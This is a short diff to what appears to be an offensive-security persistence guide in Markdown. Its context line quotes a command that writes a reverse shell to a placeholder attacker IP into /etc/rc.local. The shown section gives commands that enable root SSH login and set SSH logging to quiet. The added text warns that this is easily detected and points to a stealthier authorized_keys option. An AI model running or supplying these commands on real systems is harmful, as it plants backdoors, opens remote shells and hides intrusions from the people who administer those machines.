@@ -21,6 +21,9 @@ echo "nohup bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1 &" >> /etc/rc.local
 
 ### Modify SSH Config
 
+!!! warning "Loud"
+    Enabling `PermitRootLogin yes` and silencing SSH logs is a highly suspicious change to `/etc/ssh/sshd_config` — any file-integrity monitoring or config-management tool (Puppet, Ansible, Chef) will flag or revert it on its next run. Prefer `authorized_keys` with `from=` restriction where possible.
+
 ```bash
 sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
 echo "LogLevel QUIET" >> /etc/ssh/sshd_config
